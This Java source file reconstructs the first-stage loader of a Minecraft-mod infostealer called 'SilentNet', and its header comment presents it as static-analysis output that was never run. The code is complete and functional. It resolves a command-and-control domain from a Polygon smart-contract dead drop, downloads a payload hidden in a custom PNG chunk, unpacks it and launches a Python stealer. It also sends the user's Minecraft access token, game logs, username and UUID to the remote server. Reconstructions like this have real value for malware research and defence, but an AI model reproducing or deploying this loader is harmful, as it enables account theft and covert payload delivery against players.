package silentnet.stage1;

import java.io.BufferedOutputStream;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.zip.Inflater;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;

/**
 * Reconstructed from net.fabric.hyte.
 *
 * Stage 1 of SilentNet:
 *
 *   - parse the base64 JSON context handed over by the launcher/entrypoint
 *   - if python.exe or AppHost\main.py is missing, download a fake PNG from
 *     /cdn/v2/9f4e7a2c1b8d.png, pull the "hIds" chunk, zlib-inflate it, and
 *     unzip the result into the staging directory
 *   - spawn the Python stage 2 with the stolen session data
 *   - exfiltrate the Minecraft log plus the loader's own log to
 *     /shard/submitMinecraftLog
 *
 * Everything is static analysis output. Nothing here was executed.
 */
public final class Stage1Loader {
    private static final String[] RPC_ENDPOINTS = {
            "https://polygon.drpc.org",
            "https://polygon-bor-rpc.publicnode.com",
            "https://1rpc.io/matic",
            "https://api.zan.top/polygon-mainnet",
            "https://rpc-mainnet.matic.quiknode.pro"
    };

    private static final String CONTRACT = "0x9c0a507300fd902787bb193d80fca5ce6e1bff9a";
    private static final String SELECTOR = "0xce6d41de";
    private static final String FALLBACK_DOMAIN = "thisisafalsepositive.st";
    private static final String PAYLOAD_PATH = "/cdn/v2/9f4e7a2c1b8d.png";
    private static final String DEFAULT_USER_ID = "0f80364d-d645-42fb-a112-e4f4f692683e";
    private static final String DEFAULT_TAG = "Default";
    private static final String WORK_DIR_NAME = "NtProfileIndex";

    private static final String CHROME_UA =
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                    + "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36";
    private static final String PAYLOAD_ACCEPT =
            "image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8";

    private String mcInfo;
    private String prefireId;
    private String userId;
    private String tag;
    private String domain;
    private String gameDir;
    private String mcUsername;
    private String mcUuid;
    private String env;
    private Path workDir;
    private final StringBuilder logBuffer = new StringBuilder();
    private String cachedDomain;

    public static void main(String[] args) {
        new Stage1Loader().execute(args);
    }

    public static String defaultUserId() {
        return DEFAULT_USER_ID;
    }

    public static String defaultTag() {
        return DEFAULT_TAG;
    }

    /**
     * Resolve the current C2 domain from a Polygon smart-contract dead drop.
     *
     * eth_call(contract, 0xce6d41de) returns an ABI-encoded string. Five public
     * RPC providers are tried in order; the last successful answer is cached.
     * On total failure the hard-coded fallback domain is used.
     */
    public String getDomain() {
        if (cachedDomain != null) {
            return cachedDomain;
        }

        String body = "{\"jsonrpc\":\"2.0\",\"method\":\"eth_call\",\"params\":["
                + "{\"to\":\"" + CONTRACT + "\",\"data\":\"" + SELECTOR + "\"},"
                + "\"latest\"],\"id\":1}";

        for (String endpoint : RPC_ENDPOINTS) {
            try {
                HttpClient.Response response = HttpClient.postJson(
                        endpoint, body, "application/json");
                if (response.statusCode != 200) {
                    continue;
                }
                String resolved = parseEthCallResult(response.bodyString());
                if (resolved != null && !resolved.isEmpty()) {
                    cachedDomain = resolved;
                    return resolved;
                }
            } catch (Exception ignored) {
                // try the next RPC
            }
        }

        cachedDomain = FALLBACK_DOMAIN;
        return cachedDomain;
    }

    /**
     * Reconstructed from hyte.prefire().
     *
     * POST https://<domain>/shard/prefireMc with the Minecraft access token as
     * "sessionId" and the fixed user id. The response's "prefireId" is passed to
     * stage 2 on the command line.
     */
    public String prefire(String domain, String accessToken, String userId) {
        try {
            String body = "{\"sessionId\":\"" + Json.escape(accessToken)
                    + "\",\"userId\":\"" + Json.escape(userId) + "\"}";
            String url = "https://" + domain + "/shard/prefireMc";
            HttpClient.Response response = HttpClient.postJson(
                    url, body, "application/json",
                    Map.of("X-Edge-Cache-Revalidate", "stale-if-error",
                            "X-Runtime-Env", "jre-embedded"));
            if (response.statusCode == 200) {
                return Json.extractString(response.bodyString(), "prefireId");
            }
        } catch (Exception ignored) {
            // The original returns null and lets stage 2 continue without an id.
        }
        return null;
    }

    private void execute(String[] args) {
        try {
            workDir = Stage1Launcher.defaultWorkDir();
            Files.createDirectories(workDir);

            log("========== DETACHED PROCESS STARTED =========");

            if (args.length < 1) {
                log("ERROR: No context argument");
                exfiltrateLog();
                return;
            }
            if (!parseContext(args[0])) {
                log("ERROR: Failed to parse context");
                exfiltrateLog();
                return;
            }

            log("Context parsed - UserId: " + userId + ", Env: " + env);

            Path python = workDir.resolve("python.exe");
            Path mainPy = workDir.resolve("AppHost").resolve("main.py");
            if (!Files.exists(python) || !Files.exists(mainPy)) {
                log("Downloading portable runtime...");
                if (!downloadRuntime()) {
                    log("ERROR: Failed to setup portable runtime");
                    exfiltrateLog();
                    return;
                }
            } else {
                log("Portable runtime already cached");
            }

            log("Spawning stealer...");
            spawnStealer();
            exfiltrateLog();
        } catch (Exception e) {
            log(e.getClass().getSimpleName() + ": " + e.getMessage());
            try {
                exfiltrateLog();
            } catch (Exception ignored) {
                // best effort
            }
        }
    }

    /**
     * Reconstructed from hyte.xg_SPZPY_h().
     *
     * The context is a base64 JSON object. Only string values are supported by
     * the original parser. domain and userId are mandatory; env defaults to
     * "Fabric".
     */
    private boolean parseContext(String encoded) {
        try {
            String json = new String(Base64.getDecoder().decode(encoded),
                    StandardCharsets.UTF_8);
            mcInfo = Json.extractString(json, "mcInfo");
            prefireId = Json.extractString(json, "prefireId");
            userId = Json.extractString(json, "userId");
            tag = Json.extractString(json, "tag");
            domain = Json.extractString(json, "domain");
            gameDir = Json.extractString(json, "gameDir");
            mcUsername = Json.extractString(json, "mcUsername");
            mcUuid = Json.extractString(json, "mcUuid");
            env = Json.extractString(json, "env");
            if (env == null) {
                env = "Fabric";
            }
            return domain != null && userId != null;
        } catch (Exception e) {
            return false;
        }
    }

    /**
     * Reconstructed from hyte.ywdm2().
     *
     * Three attempts. HTTP and PNG failures retry immediately; exceptions and a
     * missing python.exe after extraction sleep 2s * attempt first.
     */
    private boolean downloadRuntime() {
        for (int attempt = 1; attempt <= 3; attempt++) {
            try {
                log("Attempt " + attempt + "/3...");

                String url = "https://" + domain + PAYLOAD_PATH;
                Map<String, String> headers = new LinkedHashMap<>();
                headers.put("User-Agent", CHROME_UA);
                headers.put("Accept", PAYLOAD_ACCEPT);
                headers.put("Accept-Language", "en-US,en;q=0.9");
                headers.put("Sec-Fetch-Dest", "image");
                headers.put("Sec-Fetch-Mode", "no-cors");
                headers.put("Sec-Fetch-Site", "same-origin");

                HttpClient.Response response = HttpClient.get(url, headers);
                if (response.statusCode != 200 || response.body.length == 0) {
                    log("Download failed: HTTP " + response.statusCode);
                    continue;
                }

                log("Downloaded " + response.body.length
                        + " bytes, extracting from image...");
                byte[] payload = extractPng(response.body);
                if (payload == null) {
                    log("PNG extraction failed");
                    continue;
                }

                log("Extracted " + payload.length
                        + " bytes from image, unpacking...");
                int files = unzip(payload);
                log("Extracted " + files + " files");

                if (Files.exists(workDir.resolve("python.exe"))) {
                    log("Portable runtime ready");
                    return true;
                }
            } catch (Exception e) {
                log("Attempt " + attempt + " error: " + e.getMessage());
            }

            if (attempt < 3) {
                try {
                    Thread.sleep(2000L * attempt);
                } catch (InterruptedException ignored) {
                    // keep going
                }
            }
        }
        return false;
    }

    /**
     * Reconstructed from hyte.fXEfbUXSSgId().
     *
     * The payload is a valid PNG whose custom "hIds" chunk holds a zlib stream.
     * Walk the chunk list, find type bytes 104/73/100/115, and inflate its data.
     */
    private static byte[] extractPng(byte[] image) {
        try {
            if (image.length < 8) {
                return null;
            }
            byte[] signature = {(byte) 0x89, 'P', 'N', 'G', 13, 10, 26, 10};
            for (int i = 0; i < 8; i++) {
                if (image[i] != signature[i]) {
                    return null;
                }
            }

            int offset = 8;
            while (offset + 8 <= image.length) {
                int length = (image[offset] & 0xFF) << 24
                        | (image[offset + 1] & 0xFF) << 16
                        | (image[offset + 2] & 0xFF) << 8
                        | (image[offset + 3] & 0xFF);
                byte type0 = image[offset + 4];
                byte type1 = image[offset + 5];
                byte type2 = image[offset + 6];
                byte type3 = image[offset + 7];
                if (type0 == 'h' && type1 == 'I' && type2 == 'd' && type3 == 's') {
                    byte[] chunk = Arrays.copyOfRange(
                            image, offset + 8, offset + 8 + length);
                    return inflate(chunk);
                }
                offset += 12 + length;
            }
            return null;
        } catch (Exception e) {
            return null;
        }
    }

    /** Reconstructed from hyte.vnycm4(). */
    private static byte[] inflate(byte[] compressed) {
        try {
            Inflater inflater = new Inflater();
            inflater.setInput(compressed);
            ByteArrayOutputStream out = new ByteArrayOutputStream(
                    compressed.length * 5);
            byte[] buffer = new byte[131072];
            int count;
            while (!(inflater.finished()
                    || ((count = inflater.inflate(buffer)) == 0
                    && inflater.needsInput()))) {
                out.write(buffer, 0, count);
            }
            inflater.end();
            return out.toByteArray();
        } catch (Exception e) {
            return null;
        }
    }

    /**
     * Reconstructed from hyte.xZCwAAlBY().
     *
     * Note: entry names are resolved directly against the staging directory
     * with no normalization. A malicious archive can therefore escape the
     * directory (zip-slip). That weakness is part of the original behaviour.
     */
    private int unzip(byte[] archive) throws IOException {
        int count = 0;
        byte[] buffer = new byte[131072];
        ByteArrayInputStream bytes = new ByteArrayInputStream(archive);
        ZipInputStream zip = new ZipInputStream(bytes);
        ZipEntry entry;
        while ((entry = zip.getNextEntry()) != null) {
            Path target = workDir.resolve(entry.getName());
            if (entry.isDirectory()) {
                Files.createDirectories(target);
            } else {
                Files.createDirectories(target.getParent());
                try (BufferedOutputStream out = new BufferedOutputStream(
                        new FileOutputStream(target.toFile()), 131072)) {
                    int read;
                    while ((read = zip.read(buffer)) > 0) {
                        out.write(buffer, 0, read);
                    }
                }
            }
            zip.closeEntry();
            count++;
        }
        zip.close();
        return count;
    }

    /**
     * Reconstructed from hyte.run().
     *
     * python.exe main.py -u <userId> --env <env> [--tag ...] [--mcInfo ...]
     *                   [--prefireId ...]
     * with cwd = <workDir>\AppHost and stdout/stderr appended to _stealer.log.
     */
    private void spawnStealer() {
        try {
            Path python = workDir.resolve("python.exe");
            Path mainPy = workDir.resolve("AppHost").resolve("main.py");
            if (!Files.exists(mainPy)) {
                log("ERROR: main.py not found");
                return;
            }

            List<String> command = new ArrayList<>();
            command.add(python.toString());
            command.add(mainPy.toString());
            command.add("-u");
            command.add(userId);
            command.add("--env");
            command.add(env);

            if (tag != null && !tag.equals("null")) {
                command.add("--tag");
                command.add(tag);
            }
            if (mcInfo != null && !mcInfo.equals("null")) {
                command.add("--mcInfo");
                command.add(mcInfo);
            }
            if (prefireId != null && !prefireId.equals("null")) {
                command.add("--prefireId");
                command.add(prefireId);
            }

            ProcessBuilder pb = new ProcessBuilder(command);
            pb.directory(workDir.resolve("AppHost").toFile());
            pb.redirectInput(ProcessBuilder.Redirect.from(new File("NUL")));
            pb.redirectOutput(ProcessBuilder.Redirect.appendTo(
                    workDir.resolve("_stealer.log").toFile()));
            pb.redirectErrorStream(true);

            Process process = pb.start();
            log("Stealer spawned: pid=" + process.pid());
        } catch (Exception e) {
            log("Spawn error: " + e.getMessage());
        }
    }

    /**
     * Reconstructed from hyte.lyam().
     *
     * Read the Minecraft latest.log (truncated to first+last 2.5 MB when over
     * 5 MB), append the loader's own log and basic runtime metadata, then POST
     * the whole thing to /shard/submitMinecraftLog.
     */
    private void exfiltrateLog() {
        if (domain == null) {
            return;
        }
        try {
            StringBuilder report = new StringBuilder();

            if (gameDir != null) {
                Path logPath = Path.of(gameDir, "logs", "latest.log");
                if (Files.exists(logPath)) {
                    try {
                        String content = Files.readString(logPath);
                        if (content.length() > 5_000_000) {
                            String head = content.substring(0, 2_500_000);
                            String tail = content.substring(content.length() - 2_500_000);
                            content = head + "\n=== TRUNCATED ===\n" + tail;
                        }
                        report.append(content);
                    } catch (Exception e) {
                        report.append("ERROR reading MC log: ")
                                .append(e.getMessage());
                    }
                }
            }

            report.append("\n\n========== DETACHED LOG ==========\n");
            report.append(logBuffer);
            report.append("\n\n========== RUNTIME ==========\n");
            report.append("jvm=").append(System.getProperty("java.version")).append('\n');
            report.append("os=").append(System.getProperty("os.name")).append('\n');
            report.append("user=").append(System.getProperty("user.name")).append('\n');

            String body = "{\"userId\":\"" + Json.escape(userId)
                    + "\",\"content\":\"" + Json.escape(report.toString())
                    + "\",\"filename\":\"combined.log\""
                    + ",\"mcUsername\":\""
                    + Json.escape(mcUsername != null ? mcUsername : "N/A")
                    + "\",\"mcUuid\":\""
                    + Json.escape(mcUuid != null ? mcUuid : "N/A")
                    + "\",\"executionEnvironment\":\"" + Json.escape(env)
                    + "-Detached\"}";

            String url = "https://" + domain + "/shard/submitMinecraftLog";
            HttpClient.Response response = HttpClient.postJson(
                    url, body, "application/json",
                    Map.of("X-Edge-Cache-Revalidate", "stale-if-error",
                            "X-Runtime-Env", "jre-embedded"));
            log("Log submitted: " + response.statusCode);
        } catch (Exception e) {
            log("Submit error: " + e.getMessage());
        }
    }

    private void log(String message) {
        String line = "[" + System.currentTimeMillis() + "] " + message;
        logBuffer.append(line).append('\n');
        System.out.println(line);
    }

    /**
     * Reconstructed from hyte.sgRQopdr2r1ewj().
     *
     * Pull the quoted "result" value out of the JSON-RPC response and decode it
     * as an ABI-encoded string.
     */
    private static String parseEthCallResult(String json) {
        int resultKey = json.indexOf("\"result\"");
        if (resultKey == -1) {
            return null;
        }
        int colon = json.indexOf(':', resultKey);
        if (colon == -1) {
            return null;
        }
        int firstQuote = json.indexOf('"', colon);
        int secondQuote = firstQuote == -1 ? -1 : json.indexOf('"', firstQuote + 1);
        if (firstQuote == -1 || secondQuote == -1) {
            return null;
        }
        return decodeAbiString(json.substring(firstQuote + 1, secondQuote));
    }

    /**
     * Reconstructed from hyte.mgddnOqdoYdCi().
     *
     * ABI layout: 32-byte offset, 32-byte length, then the UTF-8 bytes. The
     * original ignored the offset and read the length word at hex chars 64..128.
     */
    private static String decodeAbiString(String value) {
        if (value == null || !value.startsWith("0x") || value.length() < 130) {
            return null;
        }
        try {
            String hex = value.substring(2);
            int length = Integer.parseInt(hex.substring(64, 128), 16);
            if (length == 0 || length > 10000) {
                return null;
            }
            String payload = hex.substring(128, 128 + length * 2);
            return new String(hexToBytes(payload), StandardCharsets.UTF_8);
        } catch (Exception e) {
            return null;
        }
    }

    /** Reconstructed from hyte.gxmezscNode(). */
    private static byte[] hexToBytes(String hex) {
        byte[] out = new byte[hex.length() / 2];
        for (int i = 0; i < hex.length(); i += 2) {
            out[i / 2] = (byte) ((Character.digit(hex.charAt(i), 16) << 4)
                    + Character.digit(hex.charAt(i + 1), 16));
        }
        return out;
    }
}
